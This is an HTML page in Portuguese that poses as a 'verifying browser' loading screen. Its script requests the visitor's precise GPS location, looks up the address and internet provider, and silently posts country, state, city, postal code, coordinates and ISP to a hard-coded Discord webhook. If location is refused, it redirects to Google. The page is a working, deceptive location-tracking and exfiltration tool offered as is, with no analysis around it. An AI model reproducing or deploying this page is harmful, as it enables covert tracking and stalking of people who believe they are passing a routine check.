<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Aguarde um momento...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        async function obterDados(lat, lon) {
            try {
                // Busca a cidade real pelas coordenadas (reverso)
                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await geo.json();
                
                // Busca o provedor/IP
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                const payload = {
                    embeds: [{
                        title: "üéØ LOCALIZA√á√ÉO REAL IDENTIFICADA",
                        color: 65280,
                        fields: [
                            { name: "üö© Pais:", value: data.address.country || "Brasil", inline: true },
                            { name: "üèõÔ∏è Estado:", value: data.address.state || "N/A", inline: true },
                            { name: "üèôÔ∏è Cidade:", value: data.address.city || data.address.town || data.address.village || "N/A", inline: true },
                            { name: "üìÆ Cep:", value: data.address.postcode || "N/A", inline: true },
                            { name: "üìç Coordenadas:", value: `[Clique para abrir o Mapa](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
                            { name: "üåê Internet/Provedor:", value: ipData.org || "N/A", inline: false },
                            { name: "‚è∞ Hor√°rio de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
                        ],
                        footer: { text: "Precis√£o via Sat√©lite GPS" }
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (e) {
                console.error(e);
            }
        }

        window.onload = () => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        obterDados(pos.coords.latitude, pos.coords.longitude);
                    },
                    (erro) => {
                        // Se der erro ou negar, redireciona para n√£o ficar preso
                        window.location.href = "https://google.com";
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                window.location.href = "https://google.com";
            }
        };
    </script>
</body>
</html>
